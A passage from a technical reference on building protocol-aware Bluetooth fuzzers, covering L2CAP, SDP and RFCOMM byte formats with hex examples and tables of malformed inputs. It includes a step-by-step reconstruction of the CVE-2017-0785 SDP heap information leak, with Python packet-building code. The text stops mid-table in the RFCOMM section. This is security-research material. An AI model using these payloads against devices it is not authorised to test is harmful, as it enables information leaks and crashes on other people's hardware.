# Lessons from Bluetooth Specifications: Technical Reference for Protocol-Aware Fuzzing

This document synthesizes byte-level protocol specifications from the Bluetooth Core Spec 5.4, IrDA OBEX 1.5, HFP 1.8, 3GPP TS 27.007/27.005, and real CVE analysis into a single reference for building protocol-aware Bluetooth fuzzers. Every hex value, field offset, and endianness note needed to implement a fuzzer is included. The goal: a developer can build a complete protocol-aware fuzzer from this document alone.

---

## 1. Protocol Stack Overview

```
+------------------------------------------------------------------+
|                        APPLICATION LAYER                          |
|  HFP/AT Cmds | PBAP | MAP | OPP | A2DP | HID | AVRCP            |
+------------------------------------------------------------------+
|                     PROFILE / MIDDLEWARE                          |
|           OBEX (over RFCOMM)    |    SDP     |   BNEP            |
+------------------------------------------------------------------+
|           RFCOMM (PSM 3)        |            |   (PSM 15)        |
|  [SOCK_STREAM, fuzzable via     |            |                   |
|   AT cmds / OBEX payloads]      |            |                   |
+------------------------------------------------------------------+
|                          L2CAP                                    |
|  Signaling (CID 0x0001 BR/EDR, 0x0005 LE)                       |
|  Fixed CIDs: ATT=0x0004, SMP=0x0006, SMP-BR=0x0007              |
|  Dynamic CIDs: 0x0040-0xFFFF                                     |
+------------------------------------------------------------------+
|                           HCI                                     |
+------------------------------------------------------------------+
|                     LINK MANAGER (LMP)                            |
+------------------------------------------------------------------+
|                      BASEBAND / RADIO                             |
+------------------------------------------------------------------+

FUZZING ACCESS MODEL:

  User-space sockets (BTPROTO_L2CAP, BTPROTO_RFCOMM):
    [YES] AT commands over RFCOMM          (kernel handles RFCOMM framing)
    [YES] OBEX over RFCOMM                 (kernel handles RFCOMM framing)
    [YES] SDP via L2CAP PSM 1              (kernel handles L2CAP framing)
    [YES] BNEP via L2CAP PSM 15            (kernel handles L2CAP framing)
    [YES] BLE ATT via L2CAP CID 0x0004     (raw PDU control)
    [YES] BLE SMP via L2CAP CID 0x0006     (raw PDU control)
    [YES] RFCOMM frames via raw L2CAP PSM 3 (bypass kernel RFCOMM)

  Requires raw HCI / user-space stack (Bumble/Scapy):
    [RAW] L2CAP signaling commands         (kernel handles signaling)
    [RAW] L2CAP config option manipulation (kernel handles negotiation)
    [RAW] Custom advertising PDUs          (hcitool / btmgmt / raw HCI)

  Requires firmware / SDR / baseband MitM:
    [FW]  LMP manipulation (KNOB, BrakTooth, BLUFFS)
    [FW]  Baseband key negotiation
    [FW]  Link-layer length manipulation
```

---

## 2. L2CAP (Logical Link Control and Adaptation Protocol)

### 2.1 Frame Format

All multi-byte fields are **little-endian**.

```
+-------------------+-------------------+--------------------+
| Length (2 bytes)   | Channel ID (2 B)  | Payload (0-N bytes)|
| LE uint16          | LE uint16         |                    |
+-------------------+-------------------+--------------------+
```

- `L2CAP_HDR_SIZE` = 4 bytes
- **Length** field = size of Payload only (excludes the 4-byte header)
- **Default MTU** = 672 bytes (BR/EDR)
- **Minimum BR/EDR MTU** = 48 bytes
- **Minimum LE MTU** = 23 bytes

**Fixed CID Assignments:**

| CID | Assignment | Notes |
|-----|-----------|-------|
| `0x0000` | Null | Invalid -- never used |
| `0x0001` | BR/EDR L2CAP Signaling | Command/response multiplexer |
| `0x0002` | Connectionless Reception | Connectionless data |
| `0x0003` | AMP Manager | AMP (deprecated in 5.3) |
| `0x0004` | ATT (Attribute Protocol) | BLE fixed channel |
| `0x0005` | LE L2CAP Signaling | LE command/response |
| `0x0006` | SMP (Security Manager) | BLE pairing |
| `0x0007` | SMP (BR/EDR) | Secure Connections over BR/EDR |
| `0x0008`-`0x003E` | Reserved | |
| `0x003F` | AMP Test Manager | |
| `0x0040`-`0xFFFF` | Dynamic | Allocated per-connection |

**PSM (Protocol/Service Multiplexer) Values:**

| PSM | Protocol | Hex |
|-----|----------|-----|
| 1 | SDP | `0x0001` |
| 3 | RFCOMM | `0x0003` |
| 15 | BNEP | `0x000F` |
| 17 | HID Control | `0x0011` |
| 19 | HID Interrupt | `0x0013` |
| 23 | AVCTP | `0x0017` |
| 25 | AVDTP | `0x0019` |
| 31 | ATT | `0x001F` |

PSM encoding rule: Least significant bit of the least significant byte must be 1; least significant bit of the most significant byte must be 0. Valid PSMs are always odd in the low byte.

### 2.2 Signaling Commands

Signaling commands are carried on CID `0x0001` (BR/EDR) or CID `0x0005` (LE). Multiple commands CAN be packed into a single L2CAP frame.

**Command Header (4 bytes):**

```
+----------+-------------+------------------+
| Code (1) | Identifier (1) | Data Length (2 LE) |
+----------+-------------+------------------+
```

- **Code**: Command type (see table below)
- **Identifier**: Non-zero, used to match requests to responses
- **Data Length**: Length of command-specific data following this header

**Complete Command Code Table:**

| Code | Name | Direction | Data Fields |
|------|------|-----------|-------------|
| `0x01` | Command Reject | Response | Reason(2 LE) + Data(var) |
| `0x02` | Connection Request | Request | PSM(2 LE) + SCID(2 LE) |
| `0x03` | Connection Response | Response | DCID(2 LE) + SCID(2 LE) + Result(2 LE) + Status(2 LE) |
| `0x04` | Configuration Request | Request | DCID(2 LE) + Flags(2 LE) + Options(var TLV) |
| `0x05` | Configuration Response | Response | SCID(2 LE) + Flags(2 LE) + Result(2 LE) + Options(var TLV) |
| `0x06` | Disconnection Request | Request | DCID(2 LE) + SCID(2 LE) |
| `0x07` | Disconnection Response | Response | DCID(2 LE) + SCID(2 LE) |
| `0x08` | Echo Request | Request | Data(var, optional) |
| `0x09` | Echo Response | Response | Data(var, echoed) |
| `0x0A` | Information Request | Request | InfoType(2 LE) |
| `0x0B` | Information Response | Response | InfoType(2 LE) + Result(2 LE) + Data(var) |
| `0x0C` | Create Channel Request | Request | PSM(2 LE) + SCID(2 LE) + ControllerID(1) |
| `0x0D` | Create Channel Response | Response | DCID(2 LE) + SCID(2 LE) + Result(2 LE) + Status(2 LE) |
| `0x0E` | Move Channel Request | Request | ICID(2 LE) + DestControllerID(1) |
| `0x0F` | Move Channel Response | Response | ICID(2 LE) + Result(2 LE) |
| `0x10` | Move Channel Confirmation | Request | ICID(2 LE) + Result(2 LE) |
| `0x11` | Move Channel Confirm Response | Response | ICID(2 LE) |
| `0x12` | Connection Parameter Update Req | LE Request | IntervalMin(2) + IntervalMax(2) + Latency(2) + Timeout(2) |
| `0x13` | Connection Parameter Update Rsp | LE Response | Result(2 LE) |
| `0x14` | LE Credit Based Connection Req | LE Request | PSM(2) + SCID(2) + MTU(2) + MPS(2) + Credits(2) |
| `0x15` | LE Credit Based Connection Rsp | LE Response | DCID(2) + MTU(2) + MPS(2) + Credits(2) + Result(2) |
| `0x16` | Flow Control Credit Indication | Both | CID(2 LE) + Credits(2 LE) |
| `0x17` | Enhanced Credit Based Conn Req | Request (BT 5.2+) | PSM(2) + MTU(2) + MPS(2) + Credits(2) + SCIDs(var, up to 5) |
| `0x18` | Enhanced Credit Based Conn Rsp | Response (BT 5.2+) | MTU(2) + MPS(2) + Credits(2) + Result(2) + DCIDs(var) |
| `0x19` | Enhanced Credit Based Reconfig Req | Request (BT 5.2+) | MTU(2) + MPS(2) + DCIDs(var) |
| `0x1A` | Enhanced Credit Based Reconfig Rsp | Response (BT 5.2+) | Result(2 LE) |

**Connection Response Result Codes:**

| Value | Meaning |
|-------|---------|
| `0x0000` | Connection successful |
| `0x0001` | Connection pending |
| `0x0002` | PSM not supported |
| `0x0003` | Security block |
| `0x0004` | No resources |
| `0x0006` | Invalid Source CID |
| `0x0007` | Source CID already allocated |

### 2.3 Configuration Options (TLV Format)

Configuration options in Config Request/Response use Type-Length-Value encoding:

```
+----------+----------+------------------+
| Type (1) | Length (1) | Value (Length B) |
+----------+----------+------------------+
```

The high bit of Type is the hint bit (0 = must understand, 1 = may be skipped if unknown).

| Type | Name | Length | Value Format | struct Format |
|------|------|--------|-------------|---------------|
| `0x01` | MTU | 2 | uint16 LE | `<H` |
| `0x02` | Flush Timeout | 2 | uint16 LE (ms, 0xFFFF=infinite) | `<H` |
| `0x03` | QoS | 22 | Flags(1) + ServiceType(1) + TokenRate(4) + TokenBucketSize(4) + PeakBandwidth(4) + Latency(4) + DelayVariation(4) | `<BB4I` |
| `0x04` | Retransmission and Flow Control | 9 | Mode(1) + TxWindowSize(1) + MaxTransmit(1) + RetransTimeout(2) + MonitorTimeout(2) + MaxPDUSize(2) | `<3B2H2H` |
| `0x05` | FCS | 1 | 0x00=No FCS, 0x01=16-bit FCS | `<B` |
| `0x06` | Extended Flow Spec | 16 | ID(1) + ServiceType(1) + MaxSDUSize(2) + SDUInterArrival(4) + AccessLatency(4) + FlushTimeout(4) | `<2BH3I` |
| `0x07` | Extended Window Size | 2 | uint16 LE | `<H` |

**RFC Mode Values (Type 0x04, Mode byte):**

| Value | Mode |
|-------|------|
| `0x00` | Basic (L2CAP default, no retransmission) |
| `0x01` | Retransmission Mode |
| `0x02` | Flow Control Mode |
| `0x03` | Enhanced Retransmission Mode (ERTM) |
| `0x04` | Streaming Mode |

**Hex example -- Config Request with MTU=672 and ERTM:**
```
04              # Code: Configuration Request
01              # Identifier: 1
0E 00           # Data Length: 14
40 00           # DCID: 0x0040
00 00           # Flags: 0 (no continuation)
01 02 A0 02     # Option: MTU, Len=2, Value=672 (0x02A0 LE)
04 09 03 0A 03  # Option: RFC, Len=9, Mode=ERTM(3), TxWindow=10, MaxTransmit=3
E8 03 E8 03     #   RetransTimeout=1000ms, MonitorTimeout=1000ms
00 04           #   MaxPDUSize=1024
```

### 2.4 Fuzzing Attack Surface

**IMPORTANT**: The existing `bt_tap/attack/fuzz.py` operates through OS kernel sockets. The kernel handles L2CAP signaling internally, so user-space code CANNOT craft raw L2CAP signaling commands through normal `BTPROTO_L2CAP` sockets. Raw L2CAP signaling fuzzing requires a user-space Bluetooth stack (Bumble, Scapy) or raw HCI.

**What CAN be fuzzed from user-space L2CAP sockets:**
- Payload data on established channels (SDP, RFCOMM, BNEP)
- ATT PDUs via CID `0x0004`
- SMP PDUs via CID `0x0006`

**What requires raw HCI / Bumble / Scapy:**

| Attack | Details | Expected Impact |
|--------|---------|-----------------|
| Length=0 or Length > actual data | L2CAP header claims N bytes, fewer/more sent | Parser confusion, buffer over-read |
| CID=`0x0000` | Null CID in L2CAP header | Null pointer dereference |
| Unknown command codes | Signaling codes `0x1B`-`0xFF` | Unhandled command crash |
| Config option with Length=0 | TLV with type but no value | Buffer under-read |
| Config option exceeding packet | TLV length > remaining bytes | Heap over-read |
| Conflicting modes (ERTM + Streaming) | RFC Mode = `0x03` in one option + `0x04` in another | State machine confusion |
| PSM=0 or even PSM | Invalid PSM in Connection Request | Should reject, but may not |
| Identifier=`0x00` | Zero identifier (spec says non-zero) | Response matching failure |
| Credits=0 in LE Credit Based | Zero initial credits | Deadlock or division by zero |
| Credits=`0xFFFF` | Maximum credits | Counter overflow |
| Send data exceeding credits | Send N+1 packets after receiving N credits | Flow control violation |
| LE Params: Interval Min > Max | Connection Parameter Update with invalid range | Validation bypass |
| LE Params: Timeout < minimum | Supervision timeout too low | Premature disconnect |
| Rapid connect/disconnect | Alternating Connection Req/Disconnect Req | Race conditions, resource leak |
| Multiple signaling in one frame | Pack conflicting commands in single L2CAP frame | Parser state confusion |

---

## 3. SDP (Service Discovery Protocol)

All multi-byte fields are **big-endian** (network byte order). SDP runs on L2CAP PSM `0x0001`.

### 3.1 PDU Format

**PDU Header (5 bytes, all PDUs):**

```
Offset  Size   Field               Encoding
0       1      PDU ID              Unsigned byte (0x01-0x07)
1       2      Transaction ID      Big-endian uint16
3       2      Parameter Length    Big-endian uint16 (everything after header)
5       ...    Parameters          PDU-specific
```

Python struct: `struct.pack('>BHH', pdu_id, txn_id, param_len)`

**PDU Types:**

| PDU ID | Name | Direction | Parameter Fields |
|--------|------|-----------|------------------|
| `0x01` | ErrorResponse | Server->Client | ErrorCode(2 BE) + ErrorInfo(var) |
| `0x02` | ServiceSearchRequest | Client->Server | ServiceSearchPattern(DES of UUIDs, max 12) + MaxServiceRecordCount(2 BE) + ContinuationState(var) |
| `0x03` | ServiceSearchResponse | Server->Client | TotalServiceRecordCount(2 BE) + CurrentServiceRecordCount(2 BE) + ServiceRecordHandleList(array of uint32 BE) + ContinuationState(var) |
| `0x04` | ServiceAttributeRequest | Client->Server | ServiceRecordHandle(4 BE) + MaximumAttributeByteCount(2 BE) + AttributeIDList(DES) + ContinuationState(var) |
| `0x05` | ServiceAttributeResponse | Server->Client | AttributeListByteCount(2 BE) + AttributeList(DES) + ContinuationState(var) |
| `0x06` | ServiceSearchAttributeRequest | Client->Server | ServiceSearchPattern(DES of UUIDs, max 12) + MaximumAttributeByteCount(2 BE) + AttributeIDList(DES) + ContinuationState(var) |
| `0x07` | ServiceSearchAttributeResponse | Server->Client | AttributeListsByteCount(2 BE) + AttributeLists(DES of DES) + ContinuationState(var) |

PDU IDs `0x00` and `0x08`-`0xFF` are reserved.

**Error Codes:**

| Code | Name |
|------|------|
| `0x0001` | SDP_Invalid_SDP_Version |
| `0x0002` | SDP_Invalid_Service_Record_Handle |
| `0x0003` | SDP_Invalid_Request_Syntax |
| `0x0004` | SDP_Invalid_PDU_Size |
| `0x0005` | SDP_Invalid_Continuation_State |
| `0x0006` | SDP_Insufficient_Resources |

**Attribute ID Range encoding**: A single attribute ID is encoded as a uint16. A range is encoded as a uint32 where high 16 bits = start, low 16 bits = end. Example: range `0x0000`-`0xFFFF` = uint32 `0x0000FFFF`.

### 3.2 Data Element Encoding

**Header Byte:**

```
Bit 7  Bit 6  Bit 5  Bit 4  Bit 3  |  Bit 2  Bit 1  Bit 0
<----  Type Descriptor (5 bits) ---->  <-- Size Index (3 bits) -->

Header byte = (TypeDescriptor << 3) | SizeIndex
Masks: TYPE_DESC_MASK = 0xF8, SIZE_DESC_MASK = 0x07
```

**Type Descriptors:**

| Value | Name | Description |
|-------|------|-------------|
| 0 | Nil | Null (size index must be 0, no data) |
| 1 | UInt | Unsigned integer |
| 2 | SInt | Signed integer (two's complement) |
| 3 | UUID | Universally Unique Identifier |
| 4 | String | Text string (UTF-8) |
| 5 | Bool | Boolean (size index must be 0, 1 byte data) |
| 6 | DES | Data Element Sequence |
| 7 | DEA | Data Element Alternative |
| 8 | URL | URL string |
| 9-31 | Reserved | UNDEFINED -- fuzzing target |

**Size Descriptors:**

| Size Index | For types 1,2 (Int) | For type 3 (UUID) | For types 0,5 (Nil,Bool) | For types 4,6,7,8 (String,DES,DEA,URL) |
|------------|--------------------|--------------------|--------------------------|----------------------------------------|
| 0 | 1 byte (8-bit) | NOT VALID | 0 bytes (Nil) / 1 byte (Bool) | NOT VALID |
| 1 | 2 bytes (16-bit) | 2 bytes (UUID16) | NOT VALID | NOT VALID |
| 2 | 4 bytes (32-bit) | 4 bytes (UUID32) | NOT VALID | NOT VALID |
| 3 | 8 bytes (64-bit) | NOT VALID | NOT VALID | NOT VALID |
| 4 | 16 bytes (128-bit) | 16 bytes (UUID128) | NOT VALID | NOT VALID |
| 5 | NOT VALID | NOT VALID | NOT VALID | Next 1 byte = uint8 length |
| 6 | NOT VALID | NOT VALID | NOT VALID | Next 2 bytes = uint16 BE length |
| 7 | NOT VALID | NOT VALID | NOT VALID | Next 4 bytes = uint32 BE length |

**Complete DTD Byte Values:**

| DTD Byte | Type | Size | Meaning |
|----------|------|------|---------|
| `0x00` | Nil | 0 | Null (DATA_NIL) |
| `0x08` | UInt | 0 (1B) | Unsigned 8-bit int |
| `0x09` | UInt | 1 (2B) | Unsigned 16-bit int |
| `0x0A` | UInt | 2 (4B) | Unsigned 32-bit int |
| `0x0B` | UInt | 3 (8B) | Unsigned 64-bit int |
| `0x0C` | UInt | 4 (16B) | Unsigned 128-bit int |
| `0x10` | SInt | 0 (1B) | Signed 8-bit int |
| `0x11` | SInt | 1 (2B) | Signed 16-bit int |
| `0x12` | SInt | 2 (4B) | Signed 32-bit int |
| `0x13` | SInt | 3 (8B) | Signed 64-bit int |
| `0x14` | SInt | 4 (16B) | Signed 128-bit int |
| `0x18` | UUID | 0 | UUID unspecified (INVALID per spec) |
| `0x19` | UUID | 1 (2B) | UUID16 |
| `0x1A` | UUID | 2 (4B) | UUID32 |
| `0x1C` | UUID | 4 (16B) | UUID128 |
| `0x20` | Str | 0 | Text string unspecified (INVALID) |
| `0x25` | Str | 5 | Text string, uint8 length prefix |
| `0x26` | Str | 6 | Text string, uint16 BE length prefix |
| `0x27` | Str | 7 | Text string, uint32 BE length prefix |
| `0x28` | Bool | 0 (1B) | Boolean |
| `0x30` | DES | 0 | Sequence unspecified (INVALID) |
| `0x35` | DES | 5 | DES, uint8 length prefix |
| `0x36` | DES | 6 | DES, uint16 BE length prefix |
| `0x37` | DES | 7 | DES, uint32 BE length prefix |
| `0x38` | DEA | 0 | Alternative unspecified (INVALID) |
| `0x3D` | DEA | 5 | DEA, uint8 length prefix |
| `0x3E` | DEA | 6 | DEA, uint16 BE length prefix |
| `0x3F` | DEA | 7 | DEA, uint32 BE length prefix |
| `0x40` | URL | 0 | URL unspecified (INVALID) |
| `0x45` | URL | 5 | URL, uint8 length prefix |
| `0x46` | URL | 6 | URL, uint16 BE length prefix |
| `0x47` | URL | 7 | URL, uint32 BE length prefix |

**Hex Examples of Data Elements:**

```
# Nil
00                                  -> Nil (no data)

# UInt8 = 0x05
08 05                               -> UInt8(5)

# UInt16 = 0x0001
09 00 01                            -> UInt16(1)

# UInt32 = 0x00010000
0A 00 01 00 00                      -> UInt32(65536)

# UUID16 = 0x0100 (L2CAP)
19 01 00                            -> UUID16(L2CAP)

# UUID32 = 0x00001101
1A 00 00 11 01                      -> UUID32(SerialPort)

# UUID128 = 00001101-0000-1000-8000-00805F9B34FB
1C 00 00 11 01 00 00 10 00          -> UUID128(SerialPort)
   80 00 00 80 5F 9B 34 FB

# Text string "Hello" (5 bytes)
25 05 48 65 6C 6C 6F                -> String8("Hello")

# Boolean true
28 01                               -> Bool(true)

# Boolean false
28 00                               -> Bool(false)

# DES containing UUID16(L2CAP) and UInt16(0x0003)
35 06                               -> DES, 6 bytes follow
   19 01 00                          ->   UUID16(0x0100 = L2CAP)
   09 00 03                          ->   UInt16(0x0003 = RFCOMM PSM)

# URL string "http://example.com" (18 bytes)
45 12 68 74 74 70 3A 2F 2F          -> URL8("http://example.com")
   65 78 61 6D 70 6C 65 2E
   63 6F 6D
```

### 3.3 Continuation State

**Format:**

```
Offset  Size   Field           Notes
0       1      InfoLength      0-16 (0 = no continuation, request complete)
1       var    Information     InfoLength bytes, implementation-specific
```

Maximum InfoLength is 16 bytes. The continuation state format is NOT standardized -- each SDP server defines its own internal meaning.

**Usage Flow:**

1. Client sends request with ContinuationState = `\x00` (InfoLength=0)
2. If response too large, server returns partial data + ContinuationState with InfoLength > 0
3. Client re-sends same request with server's ContinuationState appended
4. Repeat until server returns ContinuationState with InfoLength=0

**CVE-2017-0785 -- Android SDP Information Leak (BlueBorne):**

The Android SDP server used continuation state bytes as a **raw memory offset** into the response buffer without bounds checking.

Attack flow:
```python
# Step 1: ServiceSearchRequest for UUID 0x0100 (L2CAP, returns many handles)
# Hex: 02 00 00 00 0A  35 03 19 01 00  01 00  00
#      ^PDU  ^TID ^PLen ^DES(UUID16)    ^Max  ^Cont=0

# Step 2: Server responds with partial handles + continuation state
# Response ends with: [InfoLength][Offset_HI][Offset_LO]

# Step 3: Send DIFFERENT request (UUID 0x0001, fewer results) but attach
# the continuation state from step 2. The offset points PAST the
# smaller response buffer -> server reads out-of-bounds from heap.

# Step 4: Extract leaked bytes: response[9:-3]

# PoC packet construction:
def sdp_search_packet(service_uuid, continuation_state):
    pkt = b'\x02\x00\x00'                          # PDU=0x02, TID=0
    pkt += struct.pack('>H', 7 + len(continuation_state))  # ParamLen
    pkt += b'\x35\x03\x19'                          # DES(3), UUID16 type
    pkt += struct.pack('>H', service_uuid)           # UUID value
    pkt += b'\x01\x00'                               # MaxRecordCount=256
    pkt += continuation_state                        # Forged/relayed
    return pkt

# Key parameters: L2CAP MTU=50 (forces fragmentation), PSM=1, 30 iterations
```

**CVE-2017-1000250** (BlueZ): Similar vulnerability where BlueZ's SDP server did not validate continuation state offset against response buffer bounds.

### 3.4 Standard Attributes and UUIDs

**Universal Attributes:**

| Attribute ID | Name | Type | Notes |
|-------------|------|------|-------|
| `0x0000` | ServiceRecordHandle | UInt32 | Unique within SDP server |
| `0x0001` | ServiceClassIDList | DES | Sequence of UUIDs |
| `0x0002` | ServiceRecordState | UInt32 | Incremented on change |
| `0x0003` | ServiceID | UUID | Unique service identifier |
| `0x0004` | ProtocolDescriptorList | DES | Protocol stack description |
| `0x0005` | BrowseGroupList | DES | Browse group UUIDs |
| `0x0006` | LanguageBaseAttributeIDList | DES | (Language, Encoding, Base) triples |
| `0x0007` | ServiceInfoTimeToLive | UInt32 | Seconds until expiry |
| `0x0008` | ServiceAvailability | UInt8 | 0x00-0xFF |
| `0x0009` | BluetoothProfileDescriptorList | DES | Profile UUID + version pairs |
| `0x000A` | DocumentationURL | URL | |
| `0x000B` | ClientExecutableURL | URL | |
| `0x000C` | IconURL | URL | |
| `0x000D` | AdditionalProtocolDescListList | DES | Additional protocol stacks |

**Language-Base Offset Attributes** (base typically `0x0100`):

| Offset | Attribute | Type |
|--------|-----------|------|
| +0x0000 | ServiceName | String |
| +0x0001 | ServiceDescription | String |
| +0x0002 | ProviderName | String |

**SDP Server Attributes:**

| Attribute ID | Name | Type |
|-------------|------|------|
| `0x0200` | VersionNumberList | DES |
| `0x0201` | ServiceDatabaseState | UInt32 |

**Profile-Specific Attributes:**

| Attribute ID | Profile | Name | Type |
|-------------|---------|------|------|
| `0x0311` | HFP | SupportedFeatures | UInt16 |
| `0x0314` | PBAP | GoepL2CapPsm | UInt16 |
| `0x0317` | PBAP | SupportedRepositories | UInt8 |
| `0x0200` | PBAP 1.2+ | PbapSupportedFeatures | UInt32 |
| `0x0315` | MAP | MASInstanceID | UInt8 |
| `0x0316` | MAP | SupportedMessageTypes | UInt8 |
| `0x0317` | MAP 1.2+ | MapSupportedFeatures | UInt32 |

**Protocol UUIDs (UUID16):**

| UUID16 | Protocol |
|--------|----------|
| `0x0001` | SDP |
| `0x0002` | UDP |
| `0x0003` | RFCOMM |
| `0x0004` | TCP |
| `0x0007` | ATT |
| `0x0008` | OBEX |
| `0x000F` | BNEP |
| `0x0017` | AVCTP |
| `0x0019` | AVDTP |
| `0x0100` | L2CAP |

**Service Class UUIDs (UUID16):**

| UUID16 | Service |
|--------|---------|
| `0x1000` | SDP Server |
| `0x1002` | Public Browse Group |
| `0x1101` | Serial Port (SPP) |
| `0x1105` | OPP (Object Push) |
| `0x1106` | FTP (File Transfer) |
| `0x1108` | Headset |
| `0x110A` | Audio Source (A2DP) |
| `0x110B` | Audio Sink (A2DP) |
| `0x110E` | AV Remote Control (AVRCP) |
| `0x1112` | Headset AG |
| `0x111E` | Handsfree (HFP) |
| `0x111F` | Handsfree AG |
| `0x1115` | PANU |
| `0x1116` | NAP |
| `0x1124` | HID |
| `0x112E` | PBAP PCE |
| `0x112F` | PBAP PSE |
| `0x1130` | PBAP |
| `0x1132` | MAP MSE |
| `0x1133` | MAP MCE |
| `0x1134` | MAP |

**ProtocolDescriptorList Examples:**

RFCOMM on channel 3 over L2CAP:
```
35 11                               -> DES, 17 bytes
   35 06                            ->   DES (L2CAP layer)
      19 01 00                      ->     UUID16(0x0100 = L2CAP)
      09 00 03                      ->     UInt16(PSM = 0x0003)
   35 09                            ->   DES (RFCOMM layer)
      19 00 03                      ->     UUID16(0x0003 = RFCOMM)
      08 03                         ->     UInt8(Channel = 3)
```

OBEX over RFCOMM over L2CAP (PBAP/MAP):
```
35 17                               -> DES, 23 bytes
   35 06                            ->   DES (L2CAP)
      19 01 00                      ->     UUID16(L2CAP)
      09 00 03                      ->     UInt16(PSM = RFCOMM)
   35 09                            ->   DES (RFCOMM)
      19 00 03                      ->     UUID16(RFCOMM)
      08 05                         ->     UInt8(Channel = 5)
   35 03                            ->   DES (OBEX)
      19 00 08                      ->     UUID16(OBEX)
```

**Hex-Encoded SDP Packet Examples:**

ServiceSearchRequest -- all L2CAP services:
```
02 00 01 00 0B 35 03 19 01 00 FF FF 00
^^                                      PDU: ServiceSearchRequest
   ^^^^^ TID=1  ^^^^^ PLen=11
                     ^^^^^^^^^ DES(UUID16(L2CAP))
                                    ^^^^^ MaxCount=65535
                                          ^^ Cont=none
```

ServiceAttributeRequest -- all attributes for handle 0x00010000:
```
04 00 01 00 11 00 01 00 00 FF FF 35 05 0A 00 00 FF FF 00
^^                                                         PDU: ServiceAttributeRequest
   ^^^^^ TID=1  ^^^^^ PLen=17
                     ^^^^^^^^^^^ Handle=0x00010000
                                 ^^^^^ MaxAttrBytes=65535
                                       ^^^^^^^^^^^^^^^^^ DES(UInt32(range 0x0000-0xFFFF))
                                                         ^^ Cont=none
```

ServiceSearchAttributeRequest -- PBAP, all attributes:
```
06 00 01 00 13 35 03 19 11 30 00 40 35 05 0A 00 00 FF FF 00
^^                                                            PDU: SSAR
                     ^^^^^^^^^ DES(UUID16(0x1130=PBAP))
                                    ^^^^^ MaxAttrBytes=64
```

### 3.5 Fuzzing Attack Surface

**Data Element Malformations:**

| Attack | Hex Example | Expected Impact |
|--------|-------------|-----------------|
| Undefined type (9-31) | `48 FF` (type=9, size=0, data=0xFF) | Parser crash |
| Type 10 | `50 01 02` (type=10, size=0) | Undefined behavior |
| Invalid UUID size (1B, idx=0) | `18 FF` (UUID, size_idx=0) | Not valid per spec |
| Invalid UUID size (8B, idx=3) | `1B 00 11 01 00 00 00 00 00` | 8 bytes: not a valid UUID size |
| DES size > remaining PDU | `35 FF ...` (claims 255 bytes) | Read past PDU boundary |
| DES size = 0 | `35 00` (empty DES) | Some parsers crash |
| Deeply nested DES (100+) | `35 02 35 02 35 02 ...` recursive | Stack overflow |
| String size > PDU | `25 FF ...` + only 10 bytes | Heap over-read |
| Bool with wrong size index | `29 01` (Bool, size_idx=1, expects 2B) | Undefined behavior |
| Nil with non-zero size | `01 FF` (Nil, size_idx=1) | Parser confusion |
| UInt with var-length size (idx=5) | `0D 05 01 02 03 04 05` | Invalid combo |

**PDU-Level Attacks:**

| Attack | Details |
|--------|---------|
| ParameterLength mismatch | Header says 100 bytes, send 10 |
| ParameterLength = 0 | No parameters at all |
| ParameterLength = `0xFFFF` | Claims max, minimal data |
| MaximumServiceRecordCount = 0 | Division-by-zero or infinite loop |
| MaximumAttributeByteCount = 0 | Minimum valid = 7 |
| MaximumAttributeByteCount = 6 | Below minimum (7) |
| ServiceRecordHandle = `0xFFFFFFFF` | Non-existent handle boundary |
| ServiceRecordHandle = `0x00000000` | SDP server's own record |
| Reserved PDU ID (`0x00`, `0x08`-`0xFF`) | Undefined PDU types |
| Empty ServiceSearchPattern | `35 00` (DES with 0 UUIDs) |
| 13+ UUIDs in pattern | Max 12; overflow check |
| Empty AttributeIDList | DES with 0 entries |
| Send response PDUs as request | `0x03`, `0x05`, `0x07` to server |

**Continuation State Attacks:**

| Attack | Hex Example |
|--------|-------------|
| InfoLength > 16 | `11 00 00 ...` (17 bytes claimed) |
| InfoLength = `0xFF` | `FF 00 00 ...` (255 bytes claimed) |
| InfoLength > remaining PDU | Claims 16, only 2 bytes left |
| Forged continuation state | Arbitrary bytes |
| Cross-service continuation (CVE-2017-0785) | Use cont_state from service A in request for service B |
| Replay old continuation state | From previous session |
| All-zeros | `10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00` |
| All-0xFF | `10 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF` |
| Incremental offset probe | Increment cont_state value each iteration |

**Fuzzing Priority (by historical CVE yield):**

1. **Continuation state manipulation** -- Most fruitful historically (CVE-2017-0785, CVE-2017-1000250)
2. **Data element size/type confusion** -- Declared sizes not matching actual data
3. **PDU parameter length mismatch** -- Discrepancy triggers under/over-read
4. **Boundary values in count fields** -- MaxRecordCount=0, MaxAttrBytes<7
5. **Invalid type descriptors** -- Types 9-31; all 256 header bytes should be tested

---

## 4. RFCOMM

RFCOMM rides on L2CAP PSM `0x0003`. Based on 3GPP TS 07.10 (GSM MUX). From user-space, `socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)` gives a stream socket where the kernel handles framing. To fuzz RFCOMM framing itself, send crafted bytes over a raw L2CAP PSM 3 socket.

### 4.1 Frame Format

```
+----------+----------+----------+------------------+-------+
| Address  | Control  | Length   | Information      | FCS   |
| (1 byte) | (1 byte) | (1-2 B) | (0-N bytes)      | (1 B) |
+----------+----------+----------+------------------+-------+
```

**Address Byte:**

```
Bit 0:    EA (Extension bit) -- always 1 for RFCOMM (no multi-byte address)
Bit 1:    C/R (Command/Response) -- direction indicator
Bits 2-7: DLCI (Data Link Connection Identifier) -- channel * 2, range 0-61
```

- DLCI 0 = multiplexer control channel (PN, MSC, RPN, RLS commands)
- DLCI 2-61 = data channels (odd DLCIs for initiator, even for responder)

**Control Byte (with P/F bit in bit 4):**

| Frame Type | Without P/F | With P/F set | Description |
|-----------|-------------|--------------|-------------|
| SABM | `0x2F` | `0x3F` | Set Asynchronous Balanced Mode |
| UA | `0x63` | `0x73` | Unnumbered Acknowledgement |
| DM | `0x0F` | `0x1F` | Disconnected Mode |
| DISC | `0x43` | `0x53` | Disconnect |
| UIH | `0xEF` | `0xFF` | Unnumbered Info with Header check |

**Length Field:**

- If bit 0 (EA) = 1: single byte, length in bits 1-7 (max 127 bytes)
- If bit 0 (EA) = 0: two bytes, length in bits 1-15 (max 32767 bytes)

**FCS (Frame Check Sequence):**

- CRC polynomial: x^8 + x^2 + x + 1
- For SABM/UA/DM/DISC: CRC over Address + Control + Length bytes
- For UIH: CRC over Address + Control only (NOT Length or Info)
- FCS = 0xFF - CRC_result

### 4.2 Multiplexer Commands

Multiplexer commands are sent on DLCI 0 as UIH frames. Each command has its own TLV-like format within the UIH information field:

| Command | Description |
